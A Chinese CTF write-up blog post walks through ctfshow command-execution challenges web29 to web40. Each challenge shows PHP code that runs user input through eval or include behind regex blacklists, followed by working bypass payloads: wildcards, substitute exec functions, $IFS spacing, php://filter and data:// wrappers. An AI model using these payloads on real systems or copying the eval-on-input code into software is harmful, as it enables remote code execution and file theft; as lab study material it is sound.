\---
 layout:   post        # 使用的布局（不需要改）
 title:   从0开始学web之命令执行  # 标题 
 subtitle:   ctfshow    #副标题
 date:    2020-10-30     # 时间
 author:   yanmie       # 作者
 header-img: img/.jpg  ##标签这篇文章标题背景图片
 catalog: true            # 是否归档
 tags:                
   \- CTF

 \---



## web29~过滤关键字

```
命令执行，需要严格的过滤
```

源码：

```php
 <?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

* preg_match — 执行匹配正则表达式

题目限制了不能出现 `flag`.

构造 `?c=system(ls);` 页面回显：

```
flag.php index.php 
```

绕过 flag ,通配符绕过。

> linux 中有一些通配符。
>
> `*` 代表任意字符 0个或多个
>
> `?` 代表任意字符 1 个
>
> `[abcd]` 匹配abcd中一个字符
>
> `[a-z]` 匹配范围 a-z

payload :

```
?c=system('cat *');
?c=system('cat fl?g.php');
?c=system('cat f[a-z]ag.php');
```

执行 payload 后源代码中有显示。

另一种解法：

* eval — 把字符串作为PHP代码执行

[![BUXXi8.md.png](https://s1.ax1x.com/2020/10/31/BUXXi8.md.png)](https://imgchr.com/i/BUXXi8)

传入 `?c=echo "hello";?><?php system(ls);` 看到有flag.php ,利用文件包含。

构造：

```
?c=echo "hello";?><?php include($_GET['a']);&a=php://filter/read=convert.base64-encode/resource=flag.php
```

得到一串base64 字符串，解码得到

```php
<?php

$flag = 'flag{73c6fd37-47f1-47a4-a9a3-df83ae757139}';

```

## web30~增加命令执行函数

```
命令执行，需要严格的过滤
```

代码：

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

在上一题的基础上增加了过滤。 `flag`、`system`、`php` 

但是我们依然可以用到其他函数进行代替。

```
system()
passthru()    # passthru — 执行外部程序并且显示原始输出
exec()        # exec — 执行一个外部程序  
shell_exec()  # shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。
popen()
proc_open()
pcntl_exec()
反引号 同shell_exec() 
```

这里需要注意一下，只有system函数是有回显的，其他的函数可以通过echo等显示

```
?c=echo passthru("cat f*");
?c=echo `cat f*`;
```

或者

```
?c=echo "hello"; include($_GET['url']); ?>&url=php://filter/read=convert.base64-encode/resource=flag.php
```

题目wp:

```
echo `nl fl''ag.p''hp`;
```

## web31~过滤cat,空格

```
命令执行，需要严格的过滤
```

源码：

```php
<?php
    
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

#### 1. cat被过滤

```bash
more:一页一页的显示档案内容
less:与 more 类似
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容
grep  在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file

```

#### 2. 空格被过滤·

```bash
{$IFS}   $IFS$9
> < <> 重定向符
%09(需要php环境)
{cat,flag.php} //用逗号实现了空格功能
%20  
https://blog.csdn.net/whuslei/article/details/7187639  
```

payload:

```
?c=echo(`tac%09f*`);
```

解法二：

```
?c=include($_GET["url"]);?>&url=php://filter/read=convert.base64-encode/resource=flag.php
```

官方

```
show_source(next(array_reverse(scandir(pos(localeconv())))));
```

## web32~文件包含绕过

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

又增加过滤了 反引号、括号，echo。

#### 文件包含绕过

```
include
require
include_once
require_once
```

payload:

```
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

## web33~文件包含绕过

源码：

```php
<?php


error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}

```

多过滤了一个双引号，

直接用上一题的 payload:

```
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php

?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
```

## web34~文件包含绕过

源码：

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

过滤多了一个冒号，也是上一关payload 。

```
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php

?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
```

## web35~文件包含绕过

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

多过滤了 `<`、`=` 。没啥用，直接打

```
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php

?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
```

## web36~文件包含绕过

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

多过滤了 `数字` ，继续打。

```
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

## web37~data协议

```php
<?php

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
} 
```

过滤了flag ，又是 include 文件包含

利用伪协议读flag

```
data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行
```

payload:

```
/?c=data://text/plain,<?php system(ls);
# https://www.php.net/manual/zh/wrappers.data.php

?c=data://text/plain,<?php system('cat f*');
```

## web38~data协议

```php
 <?php

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
} 
```

同样使用data协议。

```
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs=
```

## web39~data协议

```php
<?php

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
} 
```

payload:

```
?c=data://text/plain,<?php system('cat *');?>
```

> data://text/plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用

## web40

```php
<?php

if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}

```

https://www.cnblogs.com/wrnan/p/13765680.html